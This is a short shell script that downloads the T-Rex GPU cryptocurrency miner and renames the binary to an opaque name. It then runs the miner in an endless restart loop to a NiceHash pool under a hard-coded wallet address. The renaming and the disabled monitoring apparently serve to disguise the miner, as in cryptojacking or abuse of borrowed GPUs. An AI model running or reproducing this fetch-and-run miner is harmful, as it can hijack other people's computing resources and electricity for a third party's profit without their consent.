#!/bin/sh
wget https://github.com/trexminer/T-Rex/releases/download/0.19.11/t-rex-0.19.11-linux-cuda11.1.tar.gz
tar xf t-rex-0.19.11-linux-cuda11.1.tar.gz
mv t-rex m-cuk
while [ 1 ]; do
./m-cuk -a ethash -o stratum2+tcp://daggerhashimoto.eu-north.nicehash.com:3353 -u 3DnixjsbptZsffKqTxttEDWTeFzc4SZnrL.KangBarbar -T 150 --no-watchdog --no-nvml --no-color
sleep 10
done
